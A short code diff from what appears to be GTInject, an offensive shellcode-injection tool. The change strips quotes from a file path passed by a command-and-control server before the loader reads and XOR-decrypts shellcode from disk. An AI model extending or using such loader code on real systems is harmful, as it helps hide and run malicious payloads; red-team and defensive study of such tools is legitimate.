@@ -27,7 +27,7 @@ namespace GTInject.GetShellcode
             else if (binLocation.ToLower() == "disk")
             {
                 Console.WriteLine("     Reading bytes from disk");
-                byte[] encryptedBytes = File.ReadAllBytes(bytePath);
+                byte[] encryptedBytes = File.ReadAllBytes(bytePath.Replace("\"", "")); // handle being passed in quotes from the C2
                 Console.WriteLine("     decrypting with xorkey");
                 byte[] decryptedBytes = xorfunction(encryptedBytes, xorkey);
                 Console.WriteLine("     returning plaintext bytes");
